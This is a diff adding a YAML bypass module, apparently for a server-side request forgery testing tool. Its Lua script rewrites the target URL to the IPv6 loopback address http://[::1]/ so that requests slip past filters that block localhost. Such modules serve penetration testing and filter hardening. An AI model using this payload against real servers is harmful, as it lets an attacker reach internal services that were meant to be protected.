@@ -1,0 +1,28 @@
+meta:
+  id: ipv6_loopback
+  version: 1
+  name: "IPv6 Loopback Bypass"
+  description: "Uses IPv6 loopback address"
+  author: "SSRFdevil"
+  created: "2026-06-19"
+  updated: "2026-06-19"
+  rank: 70
+  confidence: 95
+  severity: medium
+  tags: [ipv6, loopback, bypass]
+  references: []
+
+match:
+  schemes: [http, https]
+  requires: [hostname]
+  supports: [ipv6]
+
+script:
+  language: lua
+  entry: bypass
+  source: |
+    function bypass(ctx)
+      return {
+        url = "http://[::1]/"
+      }
+    end
